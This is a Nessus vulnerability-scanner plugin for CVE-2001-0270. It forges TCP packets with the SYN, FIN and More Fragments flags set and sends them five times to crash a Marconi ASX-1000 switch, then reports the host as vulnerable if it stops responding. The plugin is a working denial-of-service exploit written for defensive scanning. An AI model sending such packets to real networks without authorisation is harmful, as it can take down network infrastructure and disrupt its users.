#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10635);
 script_version("$Revision: 1.23 $");
 script_cvs_date("$Date: 2016/10/27 15:03:54 $");

 script_cve_id("CVE-2001-0270");
 script_bugtraq_id(2400);
 script_osvdb_id(10864);

 script_name(english:"Marconi ASX-1000 Switches Multiple Interface Malformed Packet DoS");
 script_summary(english:"Crashes the remote host using the 'marconi dos' attack");

 script_set_attribute(attribute:"synopsis", value:"The remote host is vulnerable a denial of service.");
 script_set_attribute(attribute:"description", value:
"The remote target may be a Marconi ASX-1000 ASX switch. It crashes
when it receives a malformed TCP packet with SYN+FIN and 'More
Fragments' flags set.

An attacker may use this flaw to shut down this host, thus preventing
your network from working properly.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2001/Feb/192");
 script_set_attribute(attribute:"solution", value:"Contact your operating system vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/02/19");
 script_set_attribute(attribute:"plugin_publication_date", value:"2001/03/25");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 # ACT_KILL_HOST in theory, but killing a switch is quite nasty
 script_category(ACT_FLOOD);
 script_copyright(english:"This script is Copyright (C) 2001-2016 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include('global_settings.inc');

if ( TARGET_IS_IPV6 ) exit(0);

if (report_paranoia < 2) audit(AUDIT_PARANOID);

addr = get_host_ip();
ip = forge_ip_packet(   ip_v : 4,
			ip_hl : 5,
			ip_tos : 0,
			ip_len : 20,
		        ip_id : rand(),
			ip_p : IPPROTO_TCP,
			ip_ttl : 255,
		        ip_off : IP_MF,
			ip_src : addr);
port = get_host_open_port();
if(!port)exit(0);

soc = open_sock_tcp(port);
if (!soc) exit(0);
close(soc);

tcpip = forge_tcp_packet(    ip	      : ip,
			     th_sport : rand() % 65535,
			     th_dport : port,
			     th_flags : TH_SYN|TH_FIN,
		             th_seq   : rand(),
			     th_ack   : 0,
			     th_x2    : 0,
		 	     th_off   : 5,
			     th_win   : 512,
			     th_urp   : 0);

#
# Ready to go...
#

start_denial();
send_packet(tcpip, pcap_active:FALSE) x 5;
sleep(5);
alive = end_denial();

if(!alive)
{
 soc = open_sock_tcp(port);
 if (soc) { close(soc); exit(0); }
 set_kb_item(name:"Host/dead", value:TRUE);
 security_hole(port);
}
